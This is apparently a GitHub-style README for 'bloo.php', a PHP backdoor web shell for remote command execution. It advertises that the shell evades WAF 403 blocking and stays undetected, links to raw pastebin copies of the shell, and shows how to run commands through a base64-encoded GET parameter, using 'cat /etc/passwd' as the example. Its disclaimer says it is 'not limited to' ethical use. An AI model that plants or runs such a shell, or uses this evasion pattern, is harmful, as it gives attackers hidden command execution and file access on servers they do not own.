# About

This RCE Payload/Backdoor Shell is made to bypass WAF 403 errors. This is also undetected in most websites.

## Pastebin Links
[bloo.php](https://pastebin.com/raw/dYB6V61V)
[bloopassthru.php](https://pastebin.com/raw/qjF1ECwj)

## Usage

```
bloo.php?bloo=[INSERT BASE64 ENCODED COMMAND]

example: cat /etc/passwd
convert: cat /etc/passwd -> Base64Encode -> Y2F0IC9ldGMvcGFzc3dk

bloo.php?bloo=Y2F0IC9ldGMvcGFzc3dk
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Discalimer
This is made for but *not limited to* ethical purposes. I am not liable to any misusage of this.

## License
[Bloos3rpent](https://twitter.com/blooserpent)
